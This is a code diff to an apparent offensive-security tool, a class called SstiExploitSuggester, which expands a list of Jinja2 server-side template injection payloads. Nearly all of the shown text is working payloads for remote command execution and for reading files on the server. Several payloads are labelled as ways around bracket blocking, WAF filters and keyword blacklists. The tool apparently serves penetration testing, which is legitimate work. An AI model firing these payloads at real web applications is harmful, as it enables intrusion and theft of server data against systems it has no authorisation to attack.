@@ -375,16 +375,26 @@ class SstiExploitSuggester:
     PAYLOADS: Dict[str, Dict[str, List[str]]] = {
         "jinja2": {
             "rce": [
-                "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
-                "{{''.__class__.__mro__[2].__subclasses__()[40]('{cmd}').read()}}",
-                "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
+                # Direct attribute access (no bracket indexing — works when [] is blocked)
                 "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
+                "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
+                "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
+                # Bracket indexing variants (when [] is allowed)
+                "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
                 "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
+                # Via request object
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
+                # Subclass chain (when direct globals access is filtered)
+                "{{''.__class__.__mro__[2].__subclasses__()[40]('{cmd}').read()}}",
+                # Loop-based WAF bypass
                 "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if 'warning' in x.__name__ %}}{{x()._module.__builtins__['__import__']('os').popen('{cmd}').read()}}{{% endif %}}{{% endfor %}}",
+                # Attr-filter bypass for keyword blacklists (split dangerous strings)
+                "{{(cycler|attr('__in'~'it__')|attr('__glo'~'bals__')).os.popen('{cmd}').read()}}",
             ],
             "file_read": [
-                "{{''.__class__.__mro__[2].__subclasses__()[40]('{file}').read()}}",
+                "{{cycler.__init__.__globals__.os.popen('cat {file}').read()}}",
                 "{{config.__class__.__init__.__globals__['os'].popen('cat {file}').read()}}",
+                "{{''.__class__.__mro__[2].__subclasses__()[40]('{file}').read()}}",
             ],
             "info": [
                 "{{config}}",
